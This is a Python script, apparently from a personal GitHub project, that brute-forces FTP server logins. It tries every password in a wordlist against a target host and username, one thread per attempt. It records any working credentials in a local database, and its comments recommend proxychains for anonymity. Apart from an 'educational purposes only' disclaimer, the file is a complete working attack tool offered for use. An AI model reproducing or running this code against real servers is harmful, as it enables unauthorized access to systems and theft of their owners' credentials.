#!/usr/bin/env/python3
'''
Author: Romeos CyberGypsy
Date: 22/03/2020
Name: ftp_brute.py
Purpose: bruteforcing ftp servers
GitHub: https://github.com/lewiswaigwa
Facebook: Romeos CyberGypsy
Copyright: (c) 2020 romeos

'''

############################
#use proxychains for anonymity
#For educational purposes only
#copying code won't make you a developer
#Respect others works
############################
import codecs
import time
import ftplib
import threading
import optparse
from termcolor import colored
import sys
from tkinter import messagebox
import sqlite3 as lite
import socket
from tqdm import tqdm
from colorama import *

class Engine:
    def __init__(self):
        #code comes here
        self.parser = optparse.OptionParser()
        self.parser.add_option("--target-ip", dest = "target_ip", help = "Target host or url")
        self.parser.add_option("--username", dest = "username", help = "Target username")
        self.parser.add_option("--wordlist", dest = "wordlist", help = "File containing passwords one per line")
        #self.parser.add_option("--threads", dest = "threads", help = "Number of threads to run concurrently. Defaults to 5", default = 5)
        self.parser.add_option("--port", dest = "port", help = "Target FTP port. Defaults to 21", default = "21")

        (self.values, self.keys) = self.parser.parse_args()

        if len(sys.argv) < 3:
            print(colored("Format: python3 ftp_brute.py --target-ip=<ipaddress> --username=<user> --wordlist=<wordlist>","green"))

        else:
            try:
                self.brute(self.values.target_ip, self.values.username, self.values.wordlist,int(self.values.port))

            except KeyboardInterrupt:
                print(colored("Exiting safely...","red"))
                sys.exit()


    def connect(self, target_ip, username, password, port):
        try:
            server = ftplib.FTP()
            port = int(port)
            server.connect(socket.gethostbyname(target_ip), port)

        except Exception as e:
            print(e)

        try:
            server.login(username, password)
            print(colored("[+] Found credentials \nUser: {} \nPassword: {}".format(username, password),"yellow"))
            creds = [username, password, target_ip]
            conn = lite.connect("passwords.db")
            cur = conn.cursor()
            cur.execute("CREATE TABLE IF NOT EXISTS Password(Username TEXT, Password TEXT, Host TEXT)")
            cur.execute("INSERT INTO Password VALUES(?,?,?)", creds)
            conn.commit()
            conn.close()
            messagebox.showinfo("Info:","Credentials found:\nUsername:{}\nPassword:{}".format(username, password))
            sys.exit()

        except:
            pass


    def brute(self, target_ip, username, wordlist, port):
        file =open(wordlist, "r", encoding = 'utf-8', errors = 'ignore')
        y = 0
        for password in file.readlines():
            y+=1

        file.close()
        file =open(wordlist,"r", encoding = "utf-8", errors = 'ignore')
        x = 0
        print(f"{Fore.BLUE}[{Fore.RED}*{Fore.BLUE}]{Fore.GREEN}Progress:")
        for password in tqdm(file.readlines()):
            password = password.strip("\n").encode('utf-8').decode()
            x+=1
            #print(colored("[-] Trying password {} of {} -> {} : {}".format(str(x), str(y),username, password),"green"))
            thread1 = threading.Thread(target = self.connect, args = (target_ip, username, password,int(port),))
            thread1.start()
            time.sleep(0.03)

            '''if x%int(threads) == 0:
                #print(colored("[!] Sleeping for 2 seconds before continue...","blue"))
                time.sleep(3)
                pass
            else:
                pass'''


if __name__ == '__main__':
    banner = '''
      ▄▄            ▗▖
 ▐▛▀  ▐▌            ▐▌              ▐▌
▐███ ▐███ ▐▙█▙      ▐▙█▙  █▟█▌▐▌ ▐▌▐███  ▟█▙
 ▐▌   ▐▌  ▐▛ ▜▌     ▐▛ ▜▌ █▘  ▐▌ ▐▌ ▐▌  ▐▙▄▟▌
 ▐▌   ▐▌  ▐▌ ▐▌     ▐▌ ▐▌ █   ▐▌ ▐▌ ▐▌  ▐▛▀▀▘
 ▐▌   ▐▙▄ ▐█▄█▘     ▐█▄█▘ █   ▐▙▄█▌ ▐▙▄ ▝█▄▄▌
 ▝▘    ▀▀ ▐▌▀▘      ▝▘▀▘  ▀    ▀▀▝▘  ▀▀  ▝▀▀
          ▐▌  '''


    print(colored(banner,"green"))

    banner2 = '''
                                 _                   _           __
\    /._o_|__|_ _ ._  |_    |_) _ ._ _  _  _  _ /   |_  _ ._/__  ._  _
 \/\/ | | |_ |_(/_| | |_)\/ | \(_)| | |(/_(_)_> \_\/|_)(/_| \_|\/|_)_>\/
                         /                        /            / |    / '''
    print(colored(banner2,"blue"))
    print("Bruteforce speed can be changed in the code by modifying the sleep time after starting each thread.\nHappy hacking!!\n")
    obj = Engine()
